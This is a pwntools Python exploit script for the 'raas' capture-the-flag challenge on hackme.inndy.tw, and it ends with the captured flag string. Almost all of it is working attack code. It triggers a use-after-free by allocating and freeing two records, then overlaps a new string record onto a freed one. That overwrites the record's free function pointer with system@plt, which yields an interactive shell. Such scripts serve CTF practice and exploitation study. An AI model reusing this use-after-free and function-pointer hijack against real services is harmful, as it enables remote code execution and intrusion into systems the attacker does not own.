from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux')
path = '/home/zander/Desktop/ctf/raas'

elf = ELF(path)
system_plt_addr = elf.plt['system']

io = remote('hackme.inndy.tw', 7719)
# io = process(path)

# records[0] = malloc(12)
io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('1')
io.recvuntil('Type > ')
io.sendline('1')
io.recvuntil('Value > ')
io.sendline('1234')

# records[1] = malloc(12)
io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('2')
io.recvuntil('Type > ')
io.sendline('1')
io.recvuntil('Value > ')
io.sendline("1234")

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('1')

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('2')

# record[2] -> records[0]
io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('3')
io.recvuntil('Type > ')
io.sendline('2')
io.recvuntil('Length > ')
io.sendline('12') # record[2].string -> records[1]
io.recvuntil('Value > ') 
payload = 'sh\x00\x00' + p32(system_plt_addr) + 'b' * 3
io.send(payload) # records[1].free -> system

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('1')

io.interactive()
io.close()

# FLAG{M0m, 1 ju5t PwN3D a C1oud 5erv1ce!!}